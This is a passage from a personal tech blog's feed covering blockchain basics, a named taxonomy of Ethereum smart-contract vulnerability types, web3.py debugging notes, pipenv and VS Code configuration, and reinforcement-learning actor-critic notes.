BLOCK</h2><p>To mine another block to the blockchain, fill out the data input andclick the button.</p><h2 id="adding-valid-blocks">ADDING VALID BLOCKS</h2><p>When adding a new block to the blockchain, the new block needs tomeet these requirements.</p><p>Block index one greater than latest block index. Block previous hashequal to latest block hash. Block hash meets difficulty requirement.Block hash is correctly calculated. Other peers on the network will beadding blocks to the blockchain, so new blocks need to be validated.</p><h2 id="peer-to-peer-network">PEER-TO-PEER NETWORK</h2><p>A global network of computers work together to keep the blockchainsecure, correct, and consistent.</p><h2 id="add-peer">ADD PEER</h2><p>Click the button to add a peer to the network.</p><h2 id="peer-status">PEER STATUS</h2><p>Peers have three states:</p><ol type="1"><li>Currently Active</li><li>Connected</li><li>Disconnected</li></ol><p>To change peer: Click on the desired peer.</p><p>To connect to a peer: On a red peer, click .</p><p>To see history between peer: On a green peer, click .</p><p>To disconnect with peer: On a green peer, click .</p><h2 id="peer-messages">PEER MESSAGES</h2><p>Peers ask for each other's blocks to determine who has the mostup-to-date blockchain.</p><h2 id="peer-communication">PEER Communication</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20205251590407624467.png"alt="peer communication" /><figcaption aria-hidden="true">peer communication</figcaption></figure><h2 id="p2p-tour-pt.1">P2P Tour PT.1</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20205251590407749347.png"alt="part1" /><figcaption aria-hidden="true">part1</figcaption></figure><ol start="0" type="1"><li>Start with the genesis block.</li><li>Add a peer &amp; connect.</li><li>Add a block.</li><li>Check history between peer.</li></ol><h2 id="p2p-tour-pt.2">P2P Tour PT.2</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20205251590407902630.png"alt="longest rule" /><figcaption aria-hidden="true">longest rule</figcaption></figure><p>The longer valid chain takes precedent over a shorter chain. Alsocalled longest chain rule.</p><h2 id="p2p-tour-pt.3">P2P Tour PT.3</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20205251590407958803.png"alt="part3" /><figcaption aria-hidden="true">part3</figcaption></figure><p>After receiving the longest valid chain, it will broadcast its latestblock to its peers.</p><p>Eventually, all the peers on the network will have the longest validchain.</p><h2 id="immutability">Immutability</h2><p>If a block is mutated, the block, and subsequent blocks becomeinvalid.</p><p>Invalid blocks are rejected by the peers on the network. They need tobe re-mined to be valid.</p><p>Earlier blocks will be harder to corrupt because there are moresubsequent invalid blocks to re-mine.</p><p>Because peers on the network are always adding new valid blocks, thehacker would have to outmine the network, which requires majorityprocessing power.</p><h2 id="attack">51% Attack</h2><p>If a participant has more than 51% of the network, he could out-minethe network and hack the blockchain.</p><p>When there are more miners in the network, the processing powerbecomes more distributed and no one has majority power. This leads to amore secure blockchain.</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>以太坊智能合约漏洞总结</title>
      <link href="/blog/2021/03/15/blockchain/eth_vulns/eth_vulns/"/>
      <url>/blog/2021/03/15/blockchain/eth_vulns/eth_vulns/</url>
      
        <content type="html"><![CDATA[<h4 id="代码规范">代码规范</h4><ul><li>ERC Standard / Deprecated standard</li><li>Unindexed ERC20 Event Parameters</li><li>Transfer To Zero Address</li><li>Use of Deprecated Solidity Functions Compiler Version<ul><li>Outdated Compiler Version</li><li>Compiler version not fixed</li></ul></li><li>Unused Variables</li><li>No Return/ Unused Return</li><li>Overload Syscall</li><li>Unprotected SELFDESTRUCT Instruction / Destroyable contracts</li><li>Fake Recharge Vulnerability(假充值)</li><li>Incorrect Constructor Name</li><li>Code With No Effects</li><li>Presence of unused variables</li><li>Typographical Error</li><li>Unencrypted Private Data On-Chain</li><li>Locked money / Freezing ether (只有存钱paybable，未自己实现一个转账函数）</li><li>Keeping secrets / Private modifier</li><li>Type casts / Unsafe type inference</li><li>Style guide violation(命名格式)</li><li>Uninitialized storage/state/local variables</li><li>Assembly usage<ul><li>Constant functions using assembly code</li></ul></li><li>misuse of a Boolean constant</li><li>Constant functions changing the state</li><li>Dangerous strict equalities</li></ul><h4 id="arithmetic-issues">Arithmetic Issues</h4><ul><li>Exponent Arithmetic Overflow（算数溢出）</li><li>Integer Overflow / Underflow</li><li>Divide before multiply</li></ul><h4 id="交易块依赖性">(交易/块)依赖性</h4><p>Front-Running / Race Condition / time-of-check vs time-of-use(TOCTOU)</p><ul><li>Displacement attack</li><li>Insertion / Transaction Order Dependence (TOD)（插队攻击）/Unpredictable state</li><li>Suppression(Block Stuffing attacks) / Transaction Congestion Attack（新型攻击）<ul><li>Block Order Dependence</li></ul></li></ul><h4 id="函数调用">函数调用</h4><ul><li>Reentrancy (重入调用)<ul><li>Reentrancy on a Single Function</li><li>Cross-function Reentrancy</li></ul></li><li>Exception disorder/Mishandled Exceptions<ul><li>Unchecked external call</li><li>Unchecked Return Values For Low Level Calls / Invoke Low Level/<code>call(), delegatecall(), callcode(), call.value(), send(), transfer() Ecrecover，Ecrecover</code></li></ul></li><li>Call to the unknown</li><li>no fallback (回调函数)</li></ul><h4 id="权限控制">权限控制</h4><ul><li>TX Origin Authentication/Origin vulnerabilities</li><li>Function Default Visibility</li><li>State Variable Default Visibility/Implicit visibilitylevel(不明确指定可见性）</li><li>Uninitialized Storage Pointer</li><li>Write to Arbitrary Storage Location</li></ul><h4 id="业务逻辑">业务逻辑</h4><ul><li>Lack of Proper Signature Verification</li><li>Requirement Violation</li><li>Incorrect Inheritance Order</li><li>Denial Of Service/Dos DoS With Block Gas Limit/ Out-of-GasVulnerability DoS with Failed Call / DoS by external contract / DoS with(Unexpected) revert / DoS by external function call in require</li><li>Block Members Manipulation<ul><li>Timestamp Dependence / Time Manipulation</li><li>Hash Collisions With Multiple Variable Length Arguments</li></ul></li><li>Unexpected Ether balance / Balance equality / Forcibly Sending Etherto a Contract</li><li>Random Number Attack(随机数攻击) / Generating randomness</li><li>Roll Back Attack(交易回滚攻击)</li></ul><h4 id="异常状态检测">异常状态检测</h4><ul><li>Assert Violation</li><li>Insufficient Gas Griefing</li></ul><h2 id="综合">综合</h2><p>包括 EVM、solidity 等设计问题与校验问题等</p><ul><li>Short Address Attack (短地址攻击)</li><li>Local/State variable shadowing(变量覆盖/变量遮蔽)</li><li>Builtin Symbol Shadowing</li><li>hash 碰撞</li><li>Right-To-Left-Override control character(SWC-130)</li></ul>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BTC-密码学原理及其数据结构</title>
      <link href="/blog/2021/03/13/blockchain/1.btc_crypto_principle/"/>
      <url>/blog/2021/03/13/blockchain/1.btc_crypto_principle/</url>
      
        <content type="html"><![CDATA[<h2 id="btc-密码学原理">BTC-密码学原理</h2><p>比特币被称为加密货币，但其实加密货币都是不加密的，所有的数据都是公开的，只是它通过唯一的二进制子串地址将现实生活中人的身份信息给隐藏了。</p><p>区块链中主要使用了两种密码学原理：哈希函数（cryptographic hashfunction）和签名</p><h2 id="哈希函数">哈希函数</h2><p>两种性质：</p><ol type="1"><li><p>collision resistance 用处：对一个 message 求 digest，用来检测对message 的篡改</p></li><li><p>hiding 意思是哈希函数的计算过程是单向、不可逆的 hiding的前提是输入空间足够大、输入分布均匀，使得 brute-force 不可行</p><p>如果输入空间不够大，常用的方法是输入拼接一个随机数，然后整体取哈希H（x||nouce）</p><p>用处是：和 collision resistance 结合，实现 digital commitment，也称digital equivalent of a sealed envelope</p></li><li><p>puzzle friendly</p><p>哈希值的计算事先是不可预测的, 比如：想得到前 k 位为 0的哈希值则只能一个个去试，而没有捷径，所以才可以 PoW</p><p>挖矿：找一个 nouce，nouce 和其他区块信息作为一个输入，计算哈希得到H(block header)，H(block header) &lt;= target space</p><p>挖矿很难，验证很容易，这个性质叫做：difficult to solve，but easy toverify</p><p>当我们设计 mining puzzle 的时候需要注意这种性质。</p><p>比特币中使用的哈希函数：SHA256（Secure Hash Algorithm）</p></li></ol><h2 id="签名">签名</h2><h3 id="比特币的账户管理">比特币的账户管理</h3><p>开户的过程：创建一个公私钥对(public key， privatekey)，公钥相当于银行账号，私钥相当于账户密码。</p><p>两个人公私钥相同的概率微乎其微，这里有个前提/假设：产生公私钥的时候有一个好的随机源a good source of randomness.</p><p>比特币使用的签名算法不只是生成公私钥的时候有一个好的随机源，之后签名的时候也要有好的随机源，只要有一次签名时用的随机源不好，那就有可能泄露私钥。</p><h2 id="数据结构">数据结构</h2><p>比特币中最基本的结构就是区块链，区块链就是一个一个区块组成的链表。区块链和普通的链表相比有什么区别:</p><p>每个区块中存储着前一个区块的哈希值，形成区块链。初始为创世区块genesis block， 最新的为 most recent block。通过这样的数据结构可以实现tamper-evident log</p><p>只要保存最后一个哈希值，就可以知道是否修改区块链任何一个部位的区块。</p><p>借助此性质，比特币中有些节点就不一定需要保存整条区块链的内容，只需要保存最近的几个就行，需要之前的向其他节点索取，并计算哈希值与自己保存的区块中上一个区块的哈希值验证就好了。</p><h1 id="double-spending-attack">double spending attack</h1><p>区块链中有两种 hash指针：一种链接各个区块之间的，指向前一个区块，将它们构成各个链表</p><p>另一种指向前面某个交易的，说明钱是从哪里来的，一方面说明钱是从哪里来的，不是捏造的，另一方面防止双花问题。</p><p>别的节点收到转账的时候，从其自身逐个向前回溯至指向的交易哈希，看转给自己的钱是否已经被花出去了。</p><p>比特币中的另外一个结构是: Merkle tree</p><h2 id="merkle-tree">merkle tree</h2><p>和 binary tree 的区别是：用哈希指针代替了普通指针</p><p>Merkle Tree，通常也被称作 Hash Tree，顾名思义，就是存储 hash值的一棵树。Merkle 树的叶子是数据块(例如，文件或者文件的集合)的 hash值。非叶节点是其对应子节点串联字符串的 hash。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/merkle_tree.jpg"alt="merkle_tree" /><figcaption aria-hidden="true">merkle_tree</figcaption></figure><p>只要记住了 root hash，就可以检测对整个树的修改。</p><p>每个区块包含 block header 和 block body。 block header里面包含哈希值，block body 里面存储交易信息</p><p>merkle 的用途：</p><ol type="1"><li>提供 merkle proof 比特币中的节点分为两类：全节点和轻节点。</li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用 python 结合区块链开发时遇到的问题汇总</title>
      <link href="/blog/2021/03/02/blockchain/ethereum/solidity_web3_issues/"/>
      <url>/blog/2021/03/02/blockchain/ethereum/solidity_web3_issues/</url>
      
        <content type="html"><![CDATA[<h2 id="varibles">Varibles</h2><p><ahref="https://medium.com/coinmonks/solidity-tutorial-all-about-mappings-29a12269ee14">mapping</a></p><h2 id="web3.py-缺陷">Web3.py 缺陷</h2><ol type="1"><li><p><a href="https://github.com/ethereum/web3.py/issues/1629">web3.py在结构体作为 event 参数时，存在 bug,不可用</a></p></li><li><p><ahref="https://ethereum.stackexchange.com/a/36070/71394">web3.py filter的 get_new_entry 在 filter 的 fromblock 为 0 时，需要先get_all_entry</a></p></li><li><p>日志过滤时间间隔： ganache等本地节点发起交易后，回显区块形成，但需要稍等 1s左右（time.sleep(1)），等待日志写入，然后过滤日志才能得到。直接发起交易，过滤日志由于日志没有写上，会导致过滤不到。</p></li></ol><h2 id="ganache-bug">ganache bug</h2><ol type="1"><li><a href="https://github.com/ethereum/web3.py/issues/674">Eventsfiltering not working with EIP checksum addresses (Ganache-CLI) · Issue#674 · ethereum/web3.py</a></li></ol><p>checksum 地址过滤，返回空，需要使用.lower()函数将地址转换为小写的。Apr 27, 2021</p><ol type="1"><li>edge.py 日志过滤那部分写的不好，导致运行出错，导致 ganache出现问题，使得 client.py 正常的过滤功能也无法实现，只能重启 ganache</li></ol><h2 id="签名">签名</h2><p>在以太坊中，常见的区块哈希、交易哈希、状态哈希等等都使用的 Keccak256哈希算法, 是抗碰撞的</p><h3 id="abi.encode-和-abi.encodepacked">abi.encode() 和abi.encodePacked()</h3><p>关于 abi.encode() 和 abi.encodPacked()，stackexchange上的这个回答比较好：<ahref="https://ethereum.stackexchange.com/questions/119583/when-to-use-abi-encode-abi-encodepacked-or-abi-encodewithsignature-in-solidity">Whento use abi.encode, abi.encodePacked or abi.encodeWithSignature insolidity - Ethereum Stack Exchange</a>。结论就是：为节省内存和Gas，一般使用abi.encodePacked()，但是当输入存在两个及以上的动态类型（string，动态数组等）时，使用它极易产生碰撞风险，因此该情况下改用abi.encode().</p><h3 id="mload-assembly-function">mload assembly function</h3><p>Solidity 支持 Inline Assembly，其使用的内联汇编语言叫：Yul.Assembly可以直接使用 opcodes 直接与 EVM 交互。</p><p>mload(0xAB) Loads the word (32byte) located at the memory address0xAB.</p><p>mload and mstore are defined in details in the yellow paper :</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16451713233749.jpg"alt="16451713233749" /><figcaption aria-hidden="true">16451713233749</figcaption></figure><h3 id="线上验证工具">线上验证工具</h3><p><a href="https://app.mycrypto.com/sign-message">MyCrypto - SignMessage</a></p><h2 id="参考文献">参考文献</h2><p><ahref="https://ethereum.stackexchange.com/questions/119583/when-to-use-abi-encode-abi-encodepacked-or-abi-encodewithsignature-in-solidity">Whento use abi.encode, abi.encodePacked or abi.encodeWithSignature insolidity - Ethereum Stack Exchange</a> <ahref="https://ethereum.stackexchange.com/questions/9603/understanding-mload-assembly-function/9610">solidity- understanding mload assembly function - Ethereum StackExchange</a></p><h2 id="注意与思考">注意与思考</h2><ol type="1"><li>函数以及其参数的命名要尽量通用</li><li>可以通过设置一个参数可选或者多设置一个参数，来使得该函数复用性增强。</li><li>tcp 数据流服务端并能确定一条消息的开头和结尾 解决：1. 固定长度分割2. 消息中增加分隔符 3. 消息开头增加消息长度字段标识 <ahref="https://stackoverflow.com/questions/21685473/python-sockets-how-to-only-receive-one-message-at-a-time">Pythonsockets: how to only receive one message at a time - StackOverflow</a></li><li>修改后的合约需要重新部署</li><li>部署合约时，别忘了选择 web3 provider</li><li>日志是相对于合约而言的，修改后新部署的合约没有日志，需要多进行一些交易，然后过滤才能有日志可言。</li><li>检查类型转换</li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pipenv 与 vscode 配置使用</title>
      <link href="/blog/2021/02/16/programming/python/configurations/pipenv_vscode/"/>
      <url>/blog/2021/02/16/programming/python/configurations/pipenv_vscode/</url>
      
        <content type="html"><![CDATA[<h2 id="pipenv-安装">Pipenv 安装</h2><p>Arch Linux: <code>yay -S python-pipenv</code>其他系统：<code>pip install pipenv</code></p><h2 id="虚拟环境路径">虚拟环境路径</h2><p>默认情况下，pipenv 在 Linux下创建的虚拟环境路径存储在：<code>~/.local/share/virtualenvs/</code>，如果找不到可以通过以下两个选项确定虚拟环境路径：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--venv                          Output virtualenv information.</span><br><span class="line">--py                            Output Python interpreter information.</span><br></pre></td></tr></table></figure><p>一般情况下，我们习惯将虚拟环境放在对应项目下面，因此需要在<code>.bashrc/.zshrc</code>(或者其他终端配置文件中) 加入<code>export PIPENV_VENV_IN_PROJECT=1</code>来让虚拟环境创建到你的项目目录中，这样就避免了以后路径更改带来的问题。</p><p>在 Windows 上我们可以采用添加环境变量的方式进行设置：添加环境变量<code>PIPENV_VENV_IN_PROJECT</code>，设置其值为 <code>true</code> 或者<code>1</code>。</p><h2 id="pipenv-vscode-使用">pipenv + vscode 使用</h2><h3 id="配置虚拟-python-解释器">配置虚拟 python 解释器</h3><p>打开项目根目录下的 <code>.vscode/settings.json</code>，如果没有，可以使用下面命令创建：<code>mkdir .vscode &amp;&amp; touch .vscode/settings.json</code>，然后将以下内容复制进去：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;files.exclude&quot;: &#123;</span><br><span class="line">        &quot;**/.git&quot;: true,</span><br><span class="line">        &quot;**/.svn&quot;: true,</span><br><span class="line">        &quot;**/.hg&quot;: true,</span><br><span class="line">        &quot;**/CVS&quot;: true,</span><br><span class="line">        &quot;**/.DS_Store&quot;: true,</span><br><span class="line">        &quot;**/*.pyc&quot;: true,</span><br><span class="line">        &quot;**/__pycache__&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;python.pythonPath&quot;: &quot;&lt;VIRTUALENV_PYTHON_PATH_HERE&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>file.exclude</code> 块对那些没有显示的文件,用现存的 VSCode设置，然后将 <code>.pyc</code> 和 <code>__pycache__</code>加入到列表中。<code>python.pythonPath</code> 用来指定该项目的 python路径， 一般写为<code>.venv/bin/python</code> 即可</p><p>然后使用 VScode 在载入项目时，在左下角点击 Python解释器，选择虚拟环境的那个即可。</p><p>关于 Code-Runner 运行使用的解释器，也可以在该项目的 setting.json里面修改，它会优先使用本地的设置覆盖全局的设置。</p><p>我的一个虚拟环境的 <code>.vscode/settings.json</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;python.pythonPath&quot;: &quot;.venv/bin/python&quot;,</span><br><span class="line">    &quot;code-runner.executorMap&quot;: &#123;</span><br><span class="line">        // code runner 配置解释器</span><br><span class="line">        &quot;python&quot;: &quot;.venv/bin/python&quot;,</span><br><span class="line">        &quot;shell&quot;: &quot;/usr/bin/zsh&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    // coder runner 配置在终端运行</span><br><span class="line">    &quot;code-runner.runInTerminal&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pipenv-简单使用">pipenv 简单使用</h2><ol type="1"><li><p>在项目根目录下创建虚拟环境或者安装包</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">cd</span> myproject</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">pipenv install requests</span></span><br></pre></td></tr></table></figure></p></li><li><p>在虚拟环境下运行脚本文件</p><ol type="1"><li><p><code>pipenv run</code>运行一次<code>pipenv run python main.py</code></p></li><li><p><code>pipenv shell</code> 进入虚拟shell，然后就可以愉快的在里面<code>python main.py</code></p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ pipenv shell</span><br><span class="line">Launching subshell in virtual environment...</span><br><span class="line">. /run/media/realyee/notes/pyworkspace/rl/.venv/bin/activate</span><br><span class="line"></span><br><span class="line"># realyee @ arch in /run/media/realyee/notes/pyworkspace/rl on git:master x [14:28:34]</span><br><span class="line">$  . /run/media/realyee/notes/pyworkspace/rl/.venv/bin/activate</span><br><span class="line">(rl)</span><br></pre></td></tr></table></figure></p></li></ol></li><li><p>退出虚拟环境 <code>exit</code></p></li><li><p>卸载某个包</p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pipenv uninstall XXX  # 卸载 XXX 模块， 并从Pipfile中移除</span><br><span class="line">pipenv uninstall --all  # 卸载全部包，并从Pipfile中移除</span><br><span class="line">pipenv uninstall --all-dev  # 卸载全部开发包， 并从Pipfile中移除</span><br></pre></td></tr></table></figure></p></li><li><p>删除虚拟环境 <code>pipenv --rm # 删除虚拟环境</code></p></li></ol><h2 id="参考文章">参考文章</h2><blockquote><ol type="1"><li><ahref="https://www.%20enjaminpack.com/blog/vs-code-python-pipenv/">VisualStudio Code, Python and pipenv</a></li><li><ahref="https://python-docs.readthedocs.io/en/latest/dev/virtualenvs.html">Pipenv&amp; Virtual Environments</a></li><li><ahref="https://blog.csdn.net/weixin_40922744/article/details/103723069">pipenv入门教程</a></li><li><ahref="https://pipenv-fork.readthedocs.io/en/latest/advanced.html">AdvancedUsage of Pipenv</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode 使用问题汇总</title>
      <link href="/blog/2021/01/16/utilities/vscode/"/>
      <url>/blog/2021/01/16/utilities/vscode/</url>
      
        <content type="html"><![CDATA[<h2 id="vscode-setting-是-json-json-规范不支持注释-注释无效果">vscodesetting 是 json， JSON 规范，不支持注释, # 注释无效果</h2><h2 id="soft-tab-和-hard-tab">soft tab 和 hard tab</h2><p>最近使用 vscode 写 markdown 时，总遇到 markdownlint 的提示，说 Nohard-tab，很是奇怪，于是上网搜索了一下。</p><p>hard-tabs 是硬件 tab，就是按一个 tab 键，soft-tabs 是软件 tab，通过按4 个 space 键实现。 提倡使用 soft-tab 代替hard-tab。（不论编程语言，还是 markdown），因为不同软件等对 hard-tab的处理不一样，因此在协作或者换工具时，容易造成意想不到的 "灾难".<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200510103028.png"alt="20200510103028" /></p><p>vscode 设置 hard-tab 自动转 soft-tab:</p><p>首先按 <code>ctrl+shift+p</code> ，输入<code>indent</code>，然后可以大致看到下图的选项，选择<code>Convert Indentation to Spaces</code>, 这样在你使用<code>tab</code> 缩进的时候，vscode 就会自动帮你把 hard-tab 转换为soft-tab 了。 <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200510103028.png" /></p><p>此外，vscode 设置 soft-tab 对应的空格数也很简单，可以通过上图中的<code>Indent Using Spaces</code> 或者点击下方状态栏右边<code>space</code> 的地方，</p><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200510103731.png" /></p><h2 id="vscode-jupyter-notebook-安装">vscode jupyter notebook 安装</h2><p>Running cells with 'Python 3.10.8 ('torch_env')' requires ipykernelpackage.</p><p>Run the following command to install 'ipykernel' into the Pythonenvironment.</p><p><code>conda install -n torch_env ipykernel --update-deps --force-reinstall</code></p>]]></content>
      
      
      <categories>
          
          <category> utilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Actor Critic Method</title>
      <link href="/blog/2020/12/17/ml/rl/actor_critic/"/>
      <url>/blog/2020/12/17/ml/rl/actor_critic/</url>
      
        <content type="html"><![CDATA[<h1 id="actor-critic-method">Actor Critic Method</h1><h2 id="introduction">Introduction</h2><p>actor 是策略网络，用来控制 Agent 去运动，可以把它看作是运动员。critic是价值网络，用来给动作打分，可以把它看作是裁判</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216134546.png"alt="cross" /><figcaption aria-hidden="true">cross</figcaption></figure><p>下面我们学习 Value Network 和 Policy Network</p><h2 id="value-network-and-policy-network">Value Network and PolicyNetwork</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216190824.png"alt="neural_net" /><figcaption aria-hidden="true">neural_net</figcaption></figure><h2 id="policy-network-actor-𝜋𝑎𝑠𝛉">Policy Network (Actor): 𝜋(𝑎|𝑠,𝛉)</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216191417.png"alt="actor" /><figcaption aria-hidden="true">actor</figcaption></figure><h2 id="value-network-critic-𝑞𝑠𝑎𝐰">Value Network (Critic): 𝑞(𝑠,𝑎;𝐰)</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216191733.png"alt="critic" /><figcaption aria-hidden="true">critic</figcaption></figure><p>这个价值网络和策略网络可以共享卷积层的参数，也可以跟策略网络完全独立。</p><h2 id="train-the-networks">Train the networks</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216192523.png"alt="train_network" /><figcaption aria-hidden="true">train_network</figcaption></figure><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216193101.png"alt="20201216193101" /><figcaption aria-hidden="true">20201216193101</figcaption></figure><h3 id="update-value-network-q-using-td">Update value network q usingTD</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216193147.png"alt="td" /><figcaption aria-hidden="true">td</figcaption></figure><h3 id="update-policy-network-π-using-policy-gradient">Update policynetwork π using policy gradient</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216193524.png"alt="20201216193524" /><figcaption aria-hidden="true">20201216193524</figcaption></figure><h2 id="actor-critic-method-1">Actor-Critic Method</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216193704.png"alt="actor_critic" /><figcaption aria-hidden="true">actor_critic</figcaption></figure><ol type="1"><li><p>Actor</p><p>Policy Network(Actor) 观测到当前状态 S，然后做出动作 a， Actor做出动作之后，Critic 会根据状态 S 和动作 a 来打一个分数记为q，并将其告知 Actor，这样 Actor 就有办法改进自己的技术了。</p><p>Actor 要靠 Critic反馈来改进自己的技术，也就是更新神经网络的参数，它通过 State s， Actiona 和 Value q 来近似算出策略梯度，然后做梯度上升来更新自己的参数。</p><p>其实这只是在迎合 Critic 的喜好而已，因此如果想要 Actor 更好，那么Critic 的水平也要好。</p></li><li><p>Critic</p><p>critic 靠 reward 来提高打分水平，裁判基于状态 S 和动作 a来打分，计算出价值 q，可以比较相邻两次 <spanclass="math display">\[q_{t}、q_{t+1 和 $r_{t}\]</span>，用 TD算法来更新相邻两次打分，这样可以让裁判打分更精准。</p></li></ol><h2 id="summary-of-algorithm">Summary of Algorithm</h2><p>每一轮迭代进行下面九个步骤，每一轮迭代中只做一个动作，观测一次奖励，更新一次神经网络的参数。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216202331.png"alt="20201216202331" /><figcaption aria-hidden="true">20201216202331</figcaption></figure><p>如果看论文和教科书，你会发现在其中第九步的 <spanclass="math inline">\(q_{t}\)</span> 它们常常使用 <spanclass="math inline">\(\delta_{t}\)</span>,也就是 TD error.这两种都是对的。使用 <span class="math inline">\(q_{t}\)</span>是标准算法，使用 <span class="math inline">\(\delta_{t}\)</span> 是policy gradient with baseline，两种都可以用数学推导出来。实际上，使用policy gradient with baseline 效果更好，因此大家往往使用它。</p><p>原因：用或者不用 baseline,并不影响期望（二者都是一样的），但是用得好的 baseline可以降低方差，让算法收敛的更快。</p><h2 id="role-of-actor-and-critic">Role of Actor and Critic</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216203827.png"alt="role" /><figcaption aria-hidden="true">role</figcaption></figure><h3 id="training">Training</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20201216203850.png"alt="training" /><figcaption aria-hidden="true">training</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
          <category> rl </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Introduction of RL</title>
      <link href="/blog/2020/12/17/ml/rl/intro/"/>
      <url>/blog/2020/12/17/ml/rl/intro/</url>
      
        <content type="html"><![CDATA[<h2 id="math">Math</h2><p>主要介绍需要用到的概率论的基础知识以及强化学习中关键术语。</p><ol type="1"><li><p>Random Variable</p><p>通常使用大写字母（如：X）表示随机变量, 使用小写字母（如：x,x1）表示随机变量的观测值（observedvalue），观测值是确定的数，没有随机性。</p></li><li><p>Probability Density Function（PDF）</p><p>概率密度函数：PDF provides a relative likelihood that the value ofthe random variable would equal that sample.</p><p>例如：连续的正态分布（也叫做高斯分布）</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20201214155842957.png"alt="image-20201214155842957" /><figcaption aria-hidden="true">image-20201214155842957</figcaption></figure><p>离散的分布：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20201214155924736.png"alt="image-20201214155924736" /><figcaption aria-hidden="true">image-20201214155924736</figcaption></figure><p>假设随机变量 X 的域为 <spanclass="math inline">\(\mathbb{X}\)</span></p><ol type="1"><li><p>连续分布</p><p><span class="math inline">\(\int_\mathbb{X} p(x)dx = 1\)</span></p><p>期望： <span class="math inline">\(\mathbb{E}[f(x)] = \int_{x\in\mathbb{X}}{p(x) \cdot f(x)}dx\)</span></p></li><li><p>离散分布</p><p><span class="math inline">\(\sum_{x \in \mathbb{X}}{p(x)} =1\)</span></p><p>期望：<span class="math inline">\(\mathbb{E}[f(x)] = \sum_{x\in\mathbb{X}}{p(x) \cdot f(x)}\)</span></p></li></ol></li><li><p>Random Sampling</p><p>随机采样：1. 知道各情况种类以及总数，去抽样 2.知道各情况概率，去抽样。</p></li></ol><h2 id="terminology">Terminology</h2><ol type="1"><li><p>state and action</p></li><li><p>policy</p><p>Policy function <span class="math inline">\(\pi\)</span> 是动作 A的概率密度函数: <span class="math inline">\(\pi(a|s) =P(A=a|S=s)\)</span> 它是在某状态 s下，采取某个特定动作（例如：A=a1）的概率。 例如：给定状态 s，动作 A离散分布的概率密度函数如下：</p><ul><li><span 